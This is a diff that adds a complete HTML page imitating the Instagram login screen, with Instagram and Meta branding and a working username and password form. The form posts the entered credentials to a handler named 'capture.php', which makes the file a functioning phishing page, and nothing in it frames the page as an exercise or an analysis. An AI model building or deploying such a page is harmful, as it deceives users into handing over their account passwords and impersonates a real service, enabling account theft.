@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram | Log in</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <style>
+    body { margin:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background:#fafafa; height:100vh; display:flex; align-items:center; justify-content:center; }
+    .container { background:#fff; border:1px solid #dbdbdb; border-radius:3px; width:350px; padding:10px 40px 30px; text-align:center; }
+    .logo { margin:30px 0 20px; font-family:Billabong,sans-serif; font-size:3.5rem; color:#262626; }
+    input { width:100%; padding:9px 8px; margin:6px 0; border:1px solid #dbdbdb; border-radius:3px; background:#fafafa; font-size:0.9rem; box-sizing:border-box; }
+    button { width:100%; background:#0095f6; color:#fff; border:none; border-radius:8px; padding:7px; font-weight:600; margin:8px 0; cursor:pointer; }
+    button:disabled { background:#b2dffc; cursor:not-allowed; }
+    .or { display:flex; align-items:center; margin:20px 0; color:#8e8e8e; font-size:0.9rem; }
+    .line { flex:1; height:1px; background:#dbdbdb; }
+    .or-text { margin:0 20px; }
+    .fb { color:#385185; margin:15px 0; font-size:0.95rem; }
+    .fb i { color:#385185; margin-right:8px; }
+    .forgot { color:#00376b; font-size:0.85rem; margin:15px 0; text-decoration:none; display:block; }
+    .signup { border:1px solid #dbdbdb; padding:15px; margin-top:20px; font-size:0.9rem; }
+    .signup a { color:#0095f6; text-decoration:none; font-weight:600; }
+    .footer { margin-top:40px; color:#8e8e8e; font-size:0.8rem; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">Instagram</div>
+    
+    <form id="loginForm" action="capture.php" method="POST">
+      <input type="text" name="username" placeholder="Phone number, username or email" required autocomplete="off"/>
+      <input type="password" name="password" placeholder="Password" required autocomplete="off"/>
+      <button type="submit" id="loginBtn">Log In</button>
+    </form>
+
+    <div class="or">
+      <div class="line"></div>
+      <div class="or-text">OR</div>
+      <div class="line"></div>
+    </div>
+
+    <div class="fb">
+      <i class="fab fa-facebook-square"></i> Log in with Facebook
+    </div>
+
+    <a href="#" class="forgot">Forgot password?</a>
+
+    <div class="signup">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+  </div>
+
+  <div class="footer">
+    © 2026 Instagram from Meta
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll('input');
+    const btn = document.getElementById('loginBtn');
+    
+    inputs.forEach(input => {
+      input.addEventListener('input', () => {
+        const allFilled = Array.from(inputs).every(i => i.value.trim() !== '');
+        btn.disabled = !allFilled;
+      });
+    });
+  </script>
+</body>
+</html>
